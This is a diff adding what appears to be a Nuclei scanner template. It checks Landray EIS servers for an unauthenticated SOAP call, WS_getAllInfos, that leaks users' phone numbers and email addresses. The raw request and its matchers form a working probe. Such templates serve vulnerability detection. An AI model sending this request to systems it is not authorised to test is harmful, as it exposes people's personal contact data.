@@ -1,0 +1,38 @@
+id: landray-eis-ws-infoleak
+
+info:
+  name: landray-eis-ws-infoleak
+  author: iSee857
+  severity: high
+  description: |
+    landray-eis-ws-infoleak
+  tags: landray,eis,info-leak
+
+http:
+  - raw:
+      - |
+        POST /WS/Basic/Basic.asmx HTTP/1.1
+        Content-Type: text/xml
+        Host: {{Hostname}}
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:WS_getAllInfos/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+          - "WS_getAllInfosResponse"
+          - "CELL_PHONE_NUMBER"
+          - "MAIL_ADDRESS"
+        condition: and
+
+      - type: status
+        status:
+          - 200
